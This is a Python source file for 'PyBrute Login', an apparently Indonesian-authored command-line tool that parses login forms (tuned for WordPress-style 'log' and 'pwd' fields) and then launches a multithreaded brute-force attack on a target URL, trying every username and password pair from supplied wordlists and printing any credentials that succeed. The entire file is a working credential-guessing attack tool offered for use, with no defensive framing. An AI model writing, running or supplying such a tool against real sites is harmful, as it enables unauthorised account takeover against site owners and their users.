import requests
from bs4 import BeautifulSoup
import argparse
from concurrent.futures import ThreadPoolExecutor
import threading
import time

def print_banner():
    banner = r"""
██████╗ ██╗   ██╗██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║   ██║██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
██║     ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
╚═╝      ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
         PyBrute Login - Brute Force & Analyzer
    """
    print(banner)

def analyze_post_params(url):
    response = requests.get(url)
    if response.status_code != 200:
        print(f"[-] Tidak dapat mengakses URL {url}. Status code: {response.status_code}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        print("[!] Tidak ditemukan form di halaman ini.")
        return

    for i, form in enumerate(forms, start=1):
        print(f"\n[+] Form #{i}")
        method = form.get('method', 'GET').upper()
        action = form.get('action', url)
        print(f"    Method: {method}")
        print(f"    Action: {action}")

        inputs = form.find_all('input')
        if not inputs:
            print("    Tidak ditemukan input field.")
            continue

        print("    Input Fields:")
        post_data = []
        for input_field in inputs:
            name = input_field.get('name', '(tidak ada nama)')
            input_type = input_field.get('type', 'text')
            value = input_field.get('value', '')
            print(f"        - Name: {name}, Type: {input_type}, Value: {value}")
            if name != '(tidak ada nama)':
                if name == 'log':
                    post_data.append(f"{name}=$user")
                elif name == 'pwd':
                    post_data.append(f"{name}=$pass")
                else:
                    post_data.append(f"{name}={value}")

        if method == 'POST':
            post_string = "&".join(post_data)
            print(f"\n    [!] Format POST data untuk brute force:")
            print(f"    --post \"{post_string}\"")

def brute_force_attempt(url, username, password, post_data, success_response, attempt_number, total_attempts):
    data = post_data.replace("$user", username).replace("$pass", password)
    response = requests.post(url, data=dict(item.split('=') for item in data.split("&")))

    progress = (attempt_number / total_attempts) * 100
    print(f"Progres: {progress:.2f}% - Mencoba: {username}:{password}")

    if success_response in response.text:
        print(f"[+] Login berhasil: {username}:{password}")

def brute_force_threading(url, username_file, password_file, post_data, success_response):
    with open(username_file, "r") as uf:
        usernames = [line.strip() for line in uf]
    with open(password_file, "r") as pf:
        passwords = [line.strip() for line in pf]

    total_attempts = len(usernames) * len(passwords)
    attempt_number = 0
    threads = []

    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=brute_force_attempt, args=(url, username, password, post_data, success_response, attempt_number, total_attempts))
            threads.append(thread)
            thread.start()
            attempt_number += 1

    for thread in threads:
        thread.join()

def brute_force_concurrent(url, username_file, password_file, post_data, success_response):
    with open(username_file, "r") as uf:
        usernames = [line.strip() for line in uf]
    with open(password_file, "r") as pf:
        passwords = [line.strip() for line in pf]

    total_attempts = len(usernames) * len(passwords)

    with ThreadPoolExecutor(max_workers=10) as executor:
        attempt_number = 0
        futures = []

        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(brute_force_attempt, url, username, password, post_data, success_response, attempt_number, total_attempts))
                attempt_number += 1

        while futures:
            for future in futures:
                if future.done():
                    futures.remove(future)
                    progress = (attempt_number / total_attempts) * 100
                    print(f"Progres: {progress:.2f}% - Mencoba kombinasi.")
                    attempt_number += 1
                time.sleep(0.1)

def brute_force(url, username_file, password_file, post_data, success_response, use_concurrent):
    if use_concurrent:
        brute_force_concurrent(url, username_file, password_file, post_data, success_response)
    else:
        brute_force_threading(url, username_file, password_file, post_data, success_response)

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Tools multifungsi: Brute force login dan analisis parameter POST.")
    subparsers = parser.add_subparsers(dest="mode", help="Mode operasi.")

    # Subparser untuk brute force
    brute_parser = subparsers.add_parser("bruteforce", help="Mode brute force.")
    brute_parser.add_argument("-H", "--host", required=True, help="Target URL")
    brute_parser.add_argument("-u", "--userlist", required=True, help="File berisi daftar username")
    brute_parser.add_argument("-p", "--passlist", required=True, help="File berisi daftar password")
    brute_parser.add_argument("--post", required=True, help="Format data POST, contoh: 'username=$user&password=$pass'")
    brute_parser.add_argument("--respon", required=True, help="Teks respons yang menunjukkan login berhasil")
    brute_parser.add_argument("--method", choices=['threading', 'concurrent'], default='concurrent', help="Metode yang digunakan: 'threading' atau 'concurrent'")

    # Subparser untuk analisis parameter
    param_parser = subparsers.add_parser("analyze", help="Mode analisis parameter POST.")
    param_parser.add_argument("-u", "--url", required=True, help="URL target untuk dianalisis.")

    args = parser.parse_args()

    if args.mode == "bruteforce":
        use_concurrent = args.method == 'concurrent'
        brute_force(args.host, args.userlist, args.passlist, args.post, args.respon, use_concurrent)
    elif args.mode == "analyze":
        analyze_post_params(args.url)
    else:
        parser.print_help()

